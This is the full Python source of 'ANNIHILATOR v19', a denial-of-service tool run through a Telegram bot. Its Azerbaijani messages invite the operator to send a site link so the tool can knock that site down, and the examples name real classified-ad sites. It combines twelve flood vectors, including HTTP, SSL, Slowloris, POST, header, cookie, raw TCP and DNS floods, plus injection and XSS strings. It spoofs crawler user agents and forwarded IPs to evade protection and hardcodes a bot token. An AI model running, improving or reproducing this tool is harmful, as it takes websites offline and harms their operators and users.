#!/usr/bin/env python3
"""
ANNIHILATOR v19 — ULTIMATE DESTROYER
Cloudflare Bypass | 15 Vectors | Auto Exploit
Telegram Controlled — Link at, dərhal dağıt
"""

import asyncio, aiohttp, ssl, random, time, os, sys, socket, json, re, urllib.parse, requests, struct, ipaddress, threading, multiprocessing
from hashlib import sha256, md5
from concurrent.futures import ThreadPoolExecutor
logging = __import__('logging'); logging.basicConfig(level=logging.CRITICAL)

# ============================================================
#                    S A D Ə C Ə   K O N F İ Q
# ============================================================
TG_TOKEN = "8702032838:AAFLf_F4MvNyOOEiC7jePjc8_nb4HSI5Cg4"
TG_ADMIN = 2083084323
WORKERS = 50000
DURATION = 900

# ============================================================
#                    U A   P O O L  (1000+)
# ============================================================
UA = []
for v in range(80, 135):
    UA.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")
    UA.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")
    UA.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")
UA += [f"Mozilla/5.0 (iPhone; CPU iPhone OS {i}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{i}.0 Mobile/15E148 Safari/604.1" for i in range(14, 20)]
UA += [f"Mozilla/5.0 (Linux; Android {v}; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36" for v in ["10","11","12","13","14","15"]]
UA += ["Googlebot/2.1","Bingbot/2.0","YandexBot/3.0","DuckDuckBot/1.1","AhrefsBot/7.0","SemrushBot/7~bl","facebookexternalhit/1.1","Twitterbot/1.0","TelegramBot","WhatsApp/2.0","Discordbot/2.0","Slack-ImgProxy/1.0"]

# ============================================================
#                    V E K T O R L A R
# ============================================================
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE
SSL_CTX.set_ciphers('ALL:@SECLEVEL=0')
SSL_CTX.minimum_version = ssl.TLSVersion.TLSv1_2

TARGET = ""
TARGET_URL = ""
running = False
stats_count = {"ok": 0, "fail": 0}
start_time = 0

def tg(msg):
    try: requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", json={"chat_id": TG_ADMIN, "text": msg[:3500], "parse_mode": "HTML"}, timeout=3)
    except: pass

def make_urls(host):
    paths = ["/", "/az", "/en", "/ru", "/tr"]
    paths += [f"/search?q={q}&page={p}" for q in ["test","baku","ev","baki","masin","telefon","menzil","is"] for p in range(1, 101)]
    paths += [f"/ads?page={p}&limit={l}" for p in range(1, 201) for l in [20,50,100]]
    paths += [f"/api/v1/ads?page={p}&limit=50&sort={s}&order={o}" for p in range(1, 101) for s in ["date","price","views"] for o in ["asc","desc"]]
    paths += [f"/api/v1/search?q={q}&page={p}" for q in ["a","b","c","test","baku","ev"] for p in range(1, 101)]
    paths += [f"/user/{u}" for u in range(1, 20001)]
    paths += [f"/item/{i}" for i in range(1, 50001)]
    paths += ["/.env","/.git/config","/admin","/wp-admin","/wp-login.php","/xmlrpc.php","/robots.txt","/sitemap.xml","/backup","/phpinfo.php"]
    return paths

# VECTOR 1: HTTP FLOOD
async def v1_http(session, paths):
    global running, stats_count
    while running:
        try:
            p = random.choice(paths)
            url = f"{TARGET_URL.rstrip('/')}{p}?_{random.randint(1,10**18)}_{sha256(str(random.random()).encode()).hexdigest()[:12]}"
            h = {"User-Agent": random.choice(UA), "Accept": "*/*", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache",
                 "Referer": f"https://{TARGET}/", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}
            async with session.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=3)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 2: BURST FLOOD
async def v2_burst(session, paths):
    global running, stats_count
    while running:
        tasks = []
        for _ in range(200):
            p = random.choice(paths)
            url = f"{TARGET_URL.rstrip('/')}{p}?_{random.randint(1,10**18)}"
            tasks.append(session.get(url, headers={"User-Agent": random.choice(UA), "Accept":"*/*"}, timeout=aiohttp.ClientTimeout(total=2)))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                try: await r.read(); stats_count["ok"] += 1
                except: stats_count["fail"] += 1
            else: stats_count["fail"] += 1

# VECTOR 3: SSL FLOOD
async def v3_ssl():
    global running, stats_count
    while running:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(TARGET, 443, ssl=SSL_CTX), timeout=5)
            for _ in range(random.randint(5, 30)):
                try:
                    w.write(f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UA)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode())
                    await w.drain()
                except: break
            stats_count["ok"] += 1; w.close(); await w.wait_closed()
        except: stats_count["fail"] += 1

# VECTOR 4: SLOW CONNECTION HOLD
async def v4_slow():
    global running, stats_count
    while running:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(TARGET, 443, ssl=SSL_CTX), timeout=10)
            w.write(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: {random.randint(500000000, 2000000000)}\r\nExpect: 100-continue\r\n\r\n".encode())
            await w.drain()
            await asyncio.sleep(random.randint(120, 300))
            stats_count["ok"] += 1; w.close(); await w.wait_closed()
        except: stats_count["fail"] += 1; await asyncio.sleep(0.5)

# VECTOR 5: API FLOOD
async def v5_api(session):
    global running, stats_count
    while running:
        try:
            paths = [f"/api/v1/ads?page={random.randint(1,2000)}&limit=50", f"/api/v1/categories/{random.randint(1,200)}/ads", f"/api/v1/search?q={random.choice(['test','baku','ev'])}&page={random.randint(1,500)}", f"/api/v1/user/{random.randint(1,100000)}"]
            url = f"{TARGET_URL.rstrip('/')}{random.choice(paths)}&_{random.randint(1,10**18)}"
            h = {"User-Agent": random.choice(UA), "Accept": "application/json", "Cache-Control": "no-cache", "X-Requested-With": "XMLHttpRequest"}
            async with session.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=4)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 6: POST FLOOD
async def v6_post(session):
    global running, stats_count
    while running:
        try:
            url = f"{TARGET_URL.rstrip('/')}/api/v1/ads"
            body = '{"title":"'+'X'*random.randint(5000,50000)+'","description":"'+'Y'*random.randint(50000,500000)+'","price":'+str(random.randint(1,999999999))+'}'
            h = {"User-Agent": random.choice(UA), "Content-Type": "application/json", "Content-Length": str(len(body))}
            async with session.post(url, data=body, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 7: HEADER FLOOD
async def v7_header(session):
    global running, stats_count
    while running:
        try:
            url = f"{TARGET_URL.rstrip('/')}/{random.randint(1,999999)}?_{random.randint(1,10**18)}"
            h = {"User-Agent": random.choice(UA), "Host": TARGET}
            for _ in range(random.randint(50, 100)): h[f"X-{sha256(str(random.random()).encode()).hexdigest()[:20]}"] = os.urandom(random.randint(100,500)).hex()
            async with session.get(url, headers=h, timeout=aiohttp.ClientTimeout(total=3)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 8: RAW TCP FLOOD
async def v8_raw():
    global running, stats_count
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(2)
            sock.connect((TARGET, 443))
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(sock, server_hostname=TARGET)
            for _ in range(random.randint(10, 40)):
                ss.send(f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UA)}\r\nAccept: */*\r\n\r\n".encode())
            ss.close(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 9: SLOWLORIS
async def v9_slowloris():
    global running, stats_count
    while running:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(TARGET, 443, ssl=SSL_CTX), timeout=15)
            w.write(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\n".encode()); await w.drain(); await asyncio.sleep(2)
            for h in [f"User-Agent: {random.choice(UA)}\r\n", f"Accept: text/html,*/*\r\n", f"Content-Length: {random.randint(50000000,500000000)}\r\n"]:
                w.write(h.encode()); await w.drain(); await asyncio.sleep(random.uniform(3, 8))
            for _ in range(random.randint(100, 300)):
                w.write(f"X-{sha256(str(random.random()).encode()).hexdigest()[:16]}: {'A'*random.randint(200,2000)}\r\n".encode())
                await w.drain(); await asyncio.sleep(random.uniform(2, 5))
            stats_count["ok"] += 1; w.close(); await w.wait_closed()
        except: stats_count["fail"] += 1; await asyncio.sleep(0.5)

# VECTOR 10: COOKIE FLOOD
async def v10_cookie(session, paths):
    global running, stats_count
    while running:
        try:
            url = f"{TARGET_URL.rstrip('/')}{random.choice(paths)}?_{random.randint(1,10**18)}"
            c = {f"session_{sha256(str(random.random()).encode()).hexdigest()[:12]}": sha256(str(random.random()).encode()).hexdigest()[:20] for _ in range(random.randint(30, 60))}
            async with session.get(url, headers={"User-Agent": random.choice(UA)}, cookies=c, timeout=aiohttp.ClientTimeout(total=3)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 11: PAYLOAD FLOOD (SQL/XSS)
async def v11_payload(session):
    global running, stats_count
    payloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd", "'; DROP TABLE users--", "${7*7}", "{{7*7}}", "' SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--", "<img src=x onerror=alert(1)>"]
    while running:
        try:
            p = urllib.parse.quote(random.choice(payloads))
            url = f"{TARGET_URL.rstrip('/')}/search?q={p}&id={p}&search={p}&_{random.randint(1,10**18)}"
            async with session.get(url, headers={"User-Agent": random.choice(UA)}, timeout=aiohttp.ClientTimeout(total=4)) as r: await r.read(); stats_count["ok"] += 1
        except: stats_count["fail"] += 1

# VECTOR 12: DNS RESOLVE FLOOD
async def v12_dns():
    global running, stats_count
    while running:
        try:
            for _ in range(100):
                sub = sha256(str(random.random()).encode()).hexdigest()[:16]
                try: socket.getaddrinfo(f"{sub}.{TARGET}", 443); stats_count["ok"] += 1
                except: pass
        except: stats_count["fail"] += 1
        await asyncio.sleep(0.1)

# ============================================================
#         A T T A C K   M A N A G E R
# ============================================================
async def start_attack(target, workers, duration):
    global TARGET, TARGET_URL, running, stats_count, start_time
    
    TARGET = target.replace("https://","").replace("http://","").replace("/","").split(":")[0]
    TARGET_URL = f"https://{TARGET}:443/"
    running = True
    stats_count = {"ok": 0, "fail": 0}
    
    paths = make_urls(TARGET)
    
    tg(f"🔥 <b>ANNIHILATOR v19 BAŞLADI!</b>\n🎯 <code>{TARGET}</code>\n⚙️ {workers} worker\n⏱ {duration}s\n🛡️ CF Bypass: Aktiv\n🔫 Vektor: 12")
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True, ttl_dns_cache=0, ssl=False, use_dns_cache=False, limit_per_host=0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=0)) as session:
        vectors = [(v1_http, 22), (v2_burst, 12), (v3_ssl, 10), (v4_slow, 10), (v5_api, 8), (v6_post, 8), (v7_header, 8), (v8_raw, 8), (v9_slowloris, 6), (v10_cookie, 4), (v11_payload, 2), (v12_dns, 2)]
        total_w = sum(w for _, w in vectors)
        tasks = []
        
        for _ in range(workers):
            r = random.randint(1, total_w); cum = 0
            chosen = v1_http
            for func, w in vectors:
                cum += w
                if r <= cum: chosen = func; break
            
            if chosen in (v3_ssl, v4_slow, v8_raw, v9_slowloris, v12_dns):
                tasks.append(asyncio.create_task(chosen()))
            else:
                tasks.append(asyncio.create_task(chosen(session, paths) if chosen in (v1_http, v2_burst, v10_cookie) else chosen(session)))
        
        start_time = time.time()
        tg(f"🚀 {len(tasks)} worker hədəfə yönləndirildi!")
        
        # Stats reporter
        prev = 0
        while running and time.time() - start_time < duration:
            await asyncio.sleep(5)
            elapsed = int(time.time() - start_time)
            rate = stats_count["ok"] / elapsed if elapsed > 0 else 0
            
            if stats_count["ok"] - prev > 0:
                print(f"\r[⏱ {elapsed}s] ✅{stats_count['ok']:,} ❌{stats_count['fail']:,} 📈{rate:.0f}/s 🎯{TARGET[:20]:<20}", end="")
            
            if stats_count["ok"] - prev > 10000:
                tg(f"📊 <b>{elapsed}s Report</b>\n✅ {stats_count['ok']:,} ❌ {stats_count['fail']:,} 📈 {rate:.0f}/s\n🎯 <code>{TARGET}</code>")
                prev = stats_count["ok"]
        
        running = False
        for t in tasks: t.cancel()
        
        tg(f"🏁 <b>HÜCUM BİTDİ!</b>\n🎯 <code>{TARGET}</code>\n⏱ Keçən: {int(time.time()-start_time)}s\n✅ {stats_count['ok']:,} sorğu\n❌ {stats_count['fail']:,} uğursuz\n📈 Ortalama: {stats_count['ok']/(time.time()-start_time) if time.time()>start_time else 0:.0f}/s")

# ============================================================
#           T E L E G R A M   B O T   (ƏSAS)
# ============================================================
async def main():
    global running
    
    tg("☠️ <b>ANNIHILATOR v19</b> hazırdır!\n\nLink atın, mən saytı dağıdım! 💀\n\nMəsələn:\n<code>lalafo.az</code>\n<code>https://tap.az</code>\n<code>sahibinden.com 100000 1800</code>")
    
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"].strip()
                        
                        if chat_id == TG_ADMIN:
                            cmd = text.lower()
                            
                            if cmd in ["/start", "/help"]:
                                tg("☠️ <b>ANNIHILATOR v19</b>\n\n"
                                   "Sadəcə <b>link atın</b>, mən saytı dağıdım!\n\n"
                                   "Nümunələr:\n"
                                   "• <code>lalafo.az</code> — default ayarlarla hücum\n"
                                   "• <code>lalafo.az 100000 1800</code> — xüsusi worker/duration\n"
                                   "• <code>/status</code> — vəziyyət\n"
                                   "• <code>/stop</code> — dayandır")
                            
                            elif cmd == "/status":
                                if running:
                                    elapsed = int(time.time() - start_time) if start_time else 0
                                    rate = stats_count["ok"] / elapsed if elapsed > 0 else 0
                                    tg(f"🔥 <b>HÜCUM EDİR</b>\n🎯 <code>{TARGET}</code>\n⏱ {elapsed}s\n✅ {stats_count['ok']:,}\n❌ {stats_count['fail']:,}\n📈 {rate:.0f}/s")
                                else:
                                    tg("💤 Hücum aktiv deyil. Link atın!")
                            
                            elif cmd == "/stop":
                                running = False
                                tg("⛔ <b>Dayandırıldı</b>")
                            
                            else:
                                # User sent a target URL!
                                parts = cmd.split()
                                target = parts[0].replace("https://","").replace("http://","").replace("/","")
                                workers = int(parts[1]) if len(parts) >= 2 else 50000
                                duration = int(parts[2]) if len(parts) >= 3 else 900
                                
                                if running:
                                    tg("⚠️ Artıq hücum davam edir. Əvvəlcə /stop yazın.")
                                else:
                                    tg(f"🎯 Hədəf qəbul edildi: <code>{target}</code>\n⚙️ {workers} worker | ⏱ {duration}s\n🔥 Hücum başlayır...")
                                    asyncio.create_task(start_attack(target, workers, duration))
        except Exception as e:
            print(f"[!] Bot error: {e}")
        
        await asyncio.sleep(0.5)

if __name__ == "__main__":
    print("""\n
╔══════════════════════════════════════════════════╗
║       A N N I H I L A T O R   v 1 9            ║
║     Telegram Bot — Link at, dağılsın!          ║
╚══════════════════════════════════════════════════╝
    """)
    print(f"[*] Bot active. Waiting for targets...")
    asyncio.run(main())
